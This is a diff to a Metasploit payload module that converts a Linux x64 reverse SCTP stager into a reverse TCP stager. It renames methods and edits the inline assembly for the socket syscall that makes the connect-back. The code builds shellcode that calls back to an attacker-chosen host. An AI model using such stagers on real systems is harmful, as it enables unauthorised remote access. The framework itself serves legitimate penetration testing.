@@ -5,11 +5,11 @@ module Msf
 
 ###
 #
-# Complex reverse SCTP payload generation for Linux ARCH_X64
+# Complex reverse TCP payload generation for Linux ARCH_X64
 #
 ###
 
-module Payload::Linux::ReverseSctp_x64
+module Payload::Linux::X64::ReverseTcp
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
@@ -30,7 +30,7 @@ module Payload::Linux::ReverseSctp_x64
       conf[:exitfunk] = datastore['EXITFUNC']
     end
 
-    generate_reverse_sctp(conf)
+    generate_reverse_tcp(conf)
   end
 
   #
@@ -42,14 +42,14 @@ module Payload::Linux::ReverseSctp_x64
   end
 
   def transport_config(opts={})
-    transport_config_reverse_sctp(opts)
+    transport_config_reverse_tcp(opts)
   end
 
   #
   # Generate and compile the stager
   #
-  def generate_reverse_sctp(opts={})
-    asm = asm_reverse_sctp(opts)
+  def generate_reverse_tcp(opts={})
+    asm = asm_reverse_tcp(opts)
     Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
   end
 
@@ -74,7 +74,7 @@ module Payload::Linux::ReverseSctp_x64
   # @option opts [String] :host The host IP to connect to
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
-  def asm_reverse_sctp(opts={})
+  def asm_reverse_tcp(opts={})
     # TODO: reliability is coming
     retry_count  = opts[:retry_count]
     reliable     = opts[:reliable]
@@ -120,9 +120,7 @@ module Payload::Linux::ReverseSctp_x64
         pop    rdi
         push   0x1
         pop    rsi
-        push   0x84 ; IPPROTO_SCTP
-        pop    rdx
-        syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP)
+        syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
         test   rax, rax
         js failed
 
